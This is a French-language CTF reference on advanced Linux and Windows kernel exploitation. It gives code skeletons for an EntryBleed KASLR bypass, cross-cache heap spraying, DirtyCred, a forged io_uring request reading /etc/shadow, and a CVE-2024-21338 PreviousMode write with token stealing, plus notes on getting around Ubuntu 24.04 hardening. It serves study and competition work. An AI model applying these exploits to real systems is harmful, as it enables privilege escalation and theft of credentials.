# CTF Pwn — Kernel Exploitation Avancée (2024-2025)

Techniques avancées pour les challenges kernel modernes : cross-cache, DirtyCred, EntryBleed, io_uring, PreviousMode, Segment Heap Windows.

## Table des matières
- [EntryBleed — KASLR bypass universel (CVE-2022-4543)](#entrybleed--kaslr-bypass-universel-cve-2022-4543)
- [SLUBStick / CROSS-X — Cross-Cache Attack](#slubstick--cross-x--cross-cache-attack)
- [DirtyCred — Credential Swapping](#dirtycred--credential-swapping)
- [io_uring Exploitation — Worker Thread Abuse](#io_uring-exploitation--worker-thread-abuse)
- [Elastic Objects — Allocation Hardening Bypass](#elastic-objects--allocation-hardening-bypass)
- [Userfaultfd Restrictions (Linux 5.11+)](#userfaultfd-restrictions-linux-511)
- [Ubuntu 24.04 Hardening — Nouveaux obstacles](#ubuntu-2404-hardening--nouveaux-obstacles)
- [Windows Kernel — PreviousMode Write (CVE-2024-21338)](#windows-kernel--previousmode-write-cve-2024-21338)
- [Windows Kernel — Segment Heap Exploitation](#windows-kernel--segment-heap-exploitation)

---

## EntryBleed — KASLR bypass universel (CVE-2022-4543)

**Source :** [willsroot.io/2022/12/entrybleed.html](https://www.willsroot.io/2022/12/entrybleed.html)  
**Impact :** Bypass KASLR sans privilèges sur tout système Linux avec KPTI activé et Intel CPU  
**Mécanisme :** Prefetch side-channel sur `entry_SYSCALL_64` via TLB timing

```c
#include <time.h>
#include <stdint.h>

// Mesurer le temps d'accès à une adresse kernel (via prefetch)
uint64_t time_prefetch(uint64_t addr) {
    struct timespec start, end;
    
    // Flush TLB de l'entrée
    __asm__ volatile("clflush (%0)" :: "r"(addr) : "memory");
    
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    // Prefetch → si dans TLB (entry_SYSCALL_64 y est après un syscall) = rapide
    __asm__ volatile(
        "prefetchnta (%0)\n"
        "prefetcht2 (%0)\n"
        :: "r"(addr) : "memory"
    );
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    return (end.tv_nsec - start.tv_nsec) + 
           (end.tv_sec - start.tv_sec) * 1000000000ULL;
}

uint64_t entrybleed_kaslr_bypass() {
    // entry_SYSCALL_64 est toujours à kernel_base + 0xC00000 (approximately)
    // Tester chaque offset possible (alignment 2MB = 512 pages de 4KB)
    
    uint64_t KERNEL_BASE_MIN = 0xffffffff80000000ULL;
    uint64_t KERNEL_BASE_MAX = 0xffffffffc0000000ULL;
    uint64_t ALIGN = 0x200000;  // 2MB alignment KASLR
    uint64_t ENTRY_OFFSET = 0xC00000;  // entry_SYSCALL_64 typical offset
    
    // Faire un syscall pour peupler le TLB avec entry_SYSCALL_64
    syscall(SYS_getpid);
    
    uint64_t min_time = UINT64_MAX;
    uint64_t best_guess = 0;
    
    for (uint64_t base = KERNEL_BASE_MIN; base < KERNEL_BASE_MAX; base += ALIGN) {
        uint64_t candidate = base + ENTRY_OFFSET;
        uint64_t t = time_prefetch(candidate);
        
        if (t < min_time) {
            min_time = t;
            best_guess = base;
        }
    }
    
    // Validation : si t < 60 cycles (cache hit) → trouvé
    // Sinon : répéter avec plus de syscalls pour peupler TLB
    return best_guess;
}
```

**Conditions :**
- CPU Intel avec KPTI activé (Linux 4.15+ par défaut)
- AMD EPYC : non vulnérable (architecture différente)
- Patché dans Linux 6.2 (janvier 2023)
- **CTF** : beaucoup de serveurs tournent encore des kernels < 6.2

---

## SLUBStick / CROSS-X — Cross-Cache Attack

**Sources :** [USENIX 2024](https://www.usenix.org/conference/usenixsecurity24/presentation/maar-slubstick) | [CCS 2025](https://dl.acm.org/doi/10.1145/3719027.3765152)  
**Concept :** Exploiter le réallocateur SLUB pour convertir un heap overflow en manipulation de page tables → AAR/AAW universel

### Principe

```
Heap overflow dans slab A (kmalloc-32)
         ↓
Vidanger le slab (free tous les objets)
         ↓
Slab pages retournent au buddy allocator
         ↓
Réclamer les pages comme slab B (kmalloc-96 ou autres)
         ↓
Corruption de l'objet adjacent dans slab B
         ↓
Objet B est une structure connue (tty_struct, seq_operations...)
         ↓
Exploit classique via la structure corrompue
```

### Implémentation Cross-Cache

```c
#include <sys/mman.h>
#include <sched.h>

// CPU pinning pour maximiser la fiabilité (éviter les partial lists cross-CPU)
void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

// Phase 1 : Allouer plein de chunks dans le slab vulnérable
#define SPRAY_COUNT 1024
int vuln_fds[SPRAY_COUNT];
for (int i = 0; i < SPRAY_COUNT; i++) {
    vuln_fds[i] = open("/dev/vuln", O_RDWR);  // kmalloc-N allocation
}

// Phase 2 : Créer des "holes" dans le slab pour isoler notre cible
// Libérer en alternance pour avoir des chunks adjacents libres
for (int i = 0; i < SPRAY_COUNT; i += 2) {
    close(vuln_fds[i]);
}

// Phase 3 : Déclencher le overflow dans le chunk restant
trigger_overflow(vuln_fds[1]);  // Overflow vers le chunk adjacent (free)

// Phase 4 : Vider TOUT le slab → pages retournent au buddy
for (int i = 1; i < SPRAY_COUNT; i += 2) {
    close(vuln_fds[i]);
}

// Phase 5 : Réclamer les pages avec des objets différents (cross-cache)
// spray avec tty_struct (kmalloc-1024) si slab cible est vidé
int ptmx_fds[256];
for (int i = 0; i < 256; i++) {
    ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);  // kmalloc-1024
}

// Phase 6 : Notre overflow corrompt maintenant un tty_struct → exploit classique
```

### Détecter CONFIG_RANDOM_KMALLOC_CACHES (Ubuntu 24.04 defense)

```bash
# Ubuntu 24.04 ajoute CONFIG_RANDOM_KMALLOC_CACHES
# Chaque boot : kmalloc-N devient un cache aléatoire parmi plusieurs
# Cross-cache devient beaucoup plus difficile (caches ne partagent pas les pages)

grep RANDOM_KMALLOC /boot/config-$(uname -r)
# → CONFIG_RANDOM_KMALLOC_CACHES=y → cross-cache très difficile
# → not set → cross-cache faisable

# Alternative : CROSS-X (CCS 2025) contourne RANDOM_KMALLOC_CACHES
# Via elastic objects qui peuvent prendre différentes tailles selon configuration
```

---

## DirtyCred — Credential Swapping

**Source :** [zplin.me/papers/DirtyCred.pdf](https://zplin.me/papers/DirtyCred.pdf)  
**Concept :** Au lieu d'écraser des pointeurs de code, swapper les `struct cred` dans le kernel heap.

```c
// DirtyCred flow :
// 1. Trouver une vuln qui permet de free() une struct cred non-SYSTEM
// 2. Sprayer le heap avec des struct cred de SYSTEM process (via setuid binaries)
// 3. Notre vuln free → struct cred libérée → alloué par SYSTEM cred spray
// 4. Les deux processus partagent maintenant le même cred → nous avons root

// Trigger spray avec pipe2() + userfaultfd (Linux < 5.11) :
int pipefd[2];
pipe2(pipefd, 0);
// Le write bloquant dans userfaultfd permet de contrôler le timing

// Alternative sans userfaultfd (Linux 5.11+) :
// Utiliser des file descriptors avec des setuid binaries
// open("/usr/bin/su") → crée une file struct avec elevated cred
// Race via multiple threads + futex pour contrôler timing

// Exploitation container escape (StarLabs 2023)
// Swap cred d'un process container avec cred host SYSTEM
// Donne accès root hors du namespace
```

**Restrictions Linux 5.11+ :**
```bash
# userfaultfd limité (nécessite CAP_SYS_PTRACE ou /dev/userfaultfd)
cat /proc/sys/vm/unprivileged_userfaultfd  # 0 = désactivé
ls -la /dev/userfaultfd  # Alternative via device si présent

# Alternative : FUSE pour race stabilization
# Ou : io_uring avec des operations lentes
```

---

## io_uring Exploitation — Worker Thread Abuse

**Source :** [chomp.ie/Blog+Posts/Put+an+io_uring+on+it](https://chomp.ie/Blog+Posts/Put+an+io_uring+on+it+-+Exploiting+the+Linux+Kernel)

**Concept :** io_uring passe certains syscalls à des kernel worker threads tournant en **ring 0 avec UID 0 et toutes les capabilities**, permettant de bypasser des checks capability-based.

```c
#include <liburing.h>

// io_uring abuse : soumettre une opération qui bypasse les checks
struct io_uring ring;
io_uring_queue_init(32, &ring, 0);

// Exemple CVE-2022-29582 : sendmsg() offloaded au kernel worker
// Le worker thread a toutes les caps → sendmsg vers socket protégé

struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
io_uring_prep_sendmsg(sqe, target_fd, &msg, 0);
io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);  // Force l'exécution async (worker)

io_uring_submit(&ring);

// Pattern CTF io_uring UAF (avec SQE injection) :
// 1. Allouer des SQEs dans un slab
// 2. UAF sur le slab → réutiliser pour forger des SQEs
// 3. Soumettre le SQE forgé : IORING_OP_OPENAT sur /etc/shadow
// 4. Worker kernel lit le fichier avec UID 0

// Créer un IORING_OP_OPENAT forgé
struct io_uring_sqe fake_sqe = {
    .opcode = IORING_OP_OPENAT,
    .fd = AT_FDCWD,
    .addr = (uint64_t)"/etc/shadow",
    .open_flags = O_RDONLY,
    .len = 0,
};
```

---

## Elastic Objects — Allocation Hardening Bypass

**Concept :** Certains objets kernel peuvent être alloués dans des caches de tailles différentes selon leur configuration. Exploiter ces "elastic objects" pour contourner RANDOM_KMALLOC_CACHES.

```c
// msg_msg : objet classique élastique
// Alloué dans kmalloc-N où N dépend de la taille du message
// Toujours alloué, jamais randomisé car dans un cache spécial

// Spray avec msg_msg pour remplacer des objets freés
struct msgbuf {
    long mtype;
    char mtext[SIZE - sizeof(long)];
};

int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
struct msgbuf msg = {.mtype = 1};

// Remplir avec payload (sera dans le heap à la taille SIZE)
memset(msg.mtext, 'A', sizeof(msg.mtext));
msgsnd(msqid, &msg, sizeof(msg.mtext), 0);

// msg_msg occupe kmalloc-64 à kmalloc-1024 selon la taille
// pipe_buffer : autre elastic object (kmalloc-192)
// user_key_payload : elastic (kmalloc-32 à kmalloc-1024)
```

---

## Userfaultfd Restrictions (Linux 5.11+)

```bash
# Vérifier si userfaultfd est disponible
cat /proc/sys/vm/unprivileged_userfaultfd  # 0 = non dispo sans privilege

# Alternatives pour race stabilization sans uffd :

# 1. FUSE (Filesystem in USErspace) - toujours disponible
# Créer un FUSE filesystem → accès read() déclenche notre callback
# Le callback peut dormir arbitrairement → fenêtre de race configurable

# 2. MADV_DONTNEED + mprotect loop (DiceCTF 2026)
# Voir kernel-techniques.md pour détails

# 3. io_uring pour opérations lentes
# io_uring avec IOSQE_ASYNC force le passage en worker thread
# Donne une fenêtre de contrôle

# 4. setxattr sur /proc/self/attr/* pour allocation contrôlée
# Allocation temporaire dans le kernel pendant l'appel setxattr

# Checker si /dev/userfaultfd existe (alternative depuis Linux 5.7)
ls -la /dev/userfaultfd  # Si mode 0660 group kvm → accessible
```

---

## Ubuntu 24.04 Hardening — Nouveaux obstacles

```bash
# Nouvelles mitigations Ubuntu 24.04 / kernel 6.8+

# 1. CONFIG_RANDOM_KMALLOC_CACHES
# Chaque cache kmalloc-N est dupliqué en N variants aléatoires
# Rend le heap grooming beaucoup plus difficile (pas de placement prévisible)

# 2. CONFIG_SLAB_BUCKETS
# Buckets séparés par context (syscall, interrupt, softirq)
# Empêche le mélange d'allocations de différents contextes

# 3. CONFIG_INIT_ON_FREE_DEFAULT_ON
# Tous les objets freés sont remis à zéro → pas de data leaks via slab reuse

# Détection :
grep -E "RANDOM_KMALLOC|SLAB_BUCKET|INIT_ON_FREE" /boot/config-$(uname -r)

# Contournements :
# - Utiliser des elastic objects non randomisés (msg_msg, pipe_buffer)
# - Cross-cache via elastic objects (CROSS-X technique)
# - Out-of-slab writes via large kmalloc (kmalloc > PAGE_SIZE → buddy directement)
# - PTE manipulation via file-backed mmap overlaps
```

---

## Windows Kernel — PreviousMode Write (CVE-2024-21338)

**Source :** [github.com/hakaioffsec/CVE-2024-21338](https://github.com/hakaioffsec/CVE-2024-21338)  
**Concept :** Modifier `KTHREAD->PreviousMode` de UserMode (1) à KernelMode (0) → bypass de TOUS les checks d'adresse kernel.

```c
// KTHREAD structure (Windows 10/11)
// +0x232 PreviousMode : UChar  (0 = KernelMode, 1 = UserMode)

// Impact : avec PreviousMode = KernelMode :
// - ProbeForRead/ProbeForWrite ne vérifient plus l'adresse
// - MmCopyVirtualMemory accepte des adresses kernel
// - NtWriteVirtualMemory peut écrire n'importe où → AAW parfait

// Exploitation CVE-2024-21338 (appid.sys - AppLocker driver)
// Vulnérabilité : NULL pointer dereference via IOCTL dans appid.sys
// → permet d'écrire dans PreviousMode via l'IOCTL vulnérable

HANDLE hDevice = CreateFileA("\\\\.\\appid", 
    GENERIC_READ | GENERIC_WRITE, 0, NULL, 
    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

// IOCTL pour modifier PreviousMode
// Payload : adresse de KTHREAD->PreviousMode + valeur 0 (KernelMode)
BYTE payload[16] = {0};
uint64_t kthread = get_current_kthread();  // Via NtQuerySystemInformation
uint64_t previousmode_addr = kthread + 0x232;

DeviceIoControl(hDevice, IOCTL_APPID_WRITE, 
                &previousmode_addr, sizeof(uint64_t),
                NULL, 0, &bytes, NULL);

// Maintenant PreviousMode = 0 (KernelMode)
// NtWriteVirtualMemory peut écrire dans n'importe quelle adresse kernel !

// Token stealing via NtWriteVirtualMemory (AAW parfait)
uint64_t system_token = get_system_token();  // Via NtQuerySystemInformation
uint64_t our_token_addr = get_our_token_addr();
NtWriteVirtualMemory(GetCurrentProcess(), 
                     (PVOID)our_token_addr, 
                     &system_token, sizeof(uint64_t), NULL);
```

### Trouver KTHREAD address depuis userland

```c
// Méthode 1 : NtQuerySystemInformation + cross-reference
SYSTEM_PROCESS_INFORMATION spi;
NtQuerySystemInformation(SystemProcessInformation, &spi, size, &needed);

// Méthode 2 : Lire GS:[0x188] via un trick NtQueryInformationThread
// Thread Information Block : GS:[0x188] = KTHREAD (accessible depuis kernel)

// Méthode 3 : NtQuerySystemInformation class 0x4D (SystemKernelDebuggerInformation)
// Leak kernel base → calculer KTHREAD depuis exports de ntoskrnl

// Méthode 4 : EnumDeviceDrivers + ReadProcessMemory
// Avec SeDebugPrivilege : lire EPROCESS list pour trouver le token
LPVOID imageBase;
EnumDeviceDrivers(&imageBase, sizeof(imageBase), &needed);
// imageBase[0] = ntoskrnl.exe base → calculer offsets depuis exports
```

---

## Windows Kernel — Segment Heap Exploitation

**Source :** [connormcgarr.github.io/swimming-in-the-kernel-pool-part-2](https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-2/)  
**Contexte :** Depuis Windows 19H1 (2019), le kernel utilise le Segment Heap au lieu du Legacy Pool pour NonPagedPoolNx.

```c
// Différences Segment Heap vs Legacy Pool
// Legacy Pool : chunks consécutifs, header POOL_HEADER prévisible
// Segment Heap : similaire à userland nt heap, plus complexe

// Structure Segment Heap (kernel)
// VS_HEAP_SUBSEGMENT → VS_CHUNK_HEADER → User data
// BackendHeap → LFH (Low Fragmentation Heap) → segments

// Spray pour Segment Heap
// Les mêmes objets qu'avant fonctionnent, mais alignment différent
// Aligner les sprays sur des segments complets (0x1000 granularité)

#define SPRAY_OBJ_SIZE  0x100  // Pour kmalloc-256 equivalent
#define SEGMENT_SIZE    0x10000 // 64KB segments

// Étape 1 : Remplir un segment entier avec nos objets
for (int i = 0; i < SEGMENT_SIZE / SPRAY_OBJ_SIZE; i++) {
    allocate_kernel_obj(SPRAY_OBJ_SIZE);
}

// Étape 2 : Créer un "hole" dans le segment (pattern alternant)
for (int i = 0; i < count; i += 2) {
    free_kernel_obj(i);
}

// Étape 3 : Notre overflow dans l'objet restant cible le trou adjacent

// Objets intéressants à corrompre (Windows 10/11)
// - DISPATCHER_HEADER (synchronization primitive)
// - _FILE_OBJECT (file struct vtable)
// - _DEVICE_OBJECT (driver dispatch table)
// - WDM IRP structures
```

### Pool tag spray (pour corrompre un tag connu)

```c
// Pool tags permettent de cibler des types d'objets spécifiques
// Tag 'NpFr' = Named Pipe fragments (toujours alloués dans NonPaged)

// Spray de Named Pipe pour cibler une allocation spécifique
for (int i = 0; i < 1000; i++) {
    HANDLE pipe_r, pipe_w;
    CreatePipe(&pipe_r, &pipe_w, NULL, 0x100);  // Force allocation NpFr
    // Conserver les handles pour maintenir l'allocation
    spray_handles[i * 2] = pipe_r;
    spray_handles[i * 2 + 1] = pipe_w;
}
```

---

## Zero-Copy Page Aliasing via vmsplice-Gift → TOCTOU (source: hxp 39C3 folly)

**Trigger:** userspace proxy (Go/C++) that copies HTTP headers from a shared buffer after a check, while a second thread can mutate that buffer; kernel allows `vmsplice(SPLICE_F_GIFT)` + `getsockopt(TCP_ZEROCOPY_RECEIVE)`.
**Signals:** `SPLICE_F_GIFT`/`SPLICE_F_MOVE` in strace, `MSG_ZEROCOPY` in sendmsg calls, `PACKET_MMAP` ring, Go runtime with cgo.
**Mechanic:** gift a user page through pipe→socket via `vm_insert_page`, which bypasses `can_map_frag`'s reverse-mapping check; kernel maps the same physical page read-write into both the proxy's and the attacker's VMA. Between the proxy's header validation and forwarding step, flip bytes cross-process with no syscall. Effective as a "kernel-assisted TOCTOU" where conventional thread races are too slow.
**Hardening hint:** hunt for missing `unmap_and_move` on gifted pages in any zero-copy path.
Source: [hxp.io/blog/123/hxp-39C3-CTF-folly](https://hxp.io/blog/123/hxp-39C3-CTF-folly/).
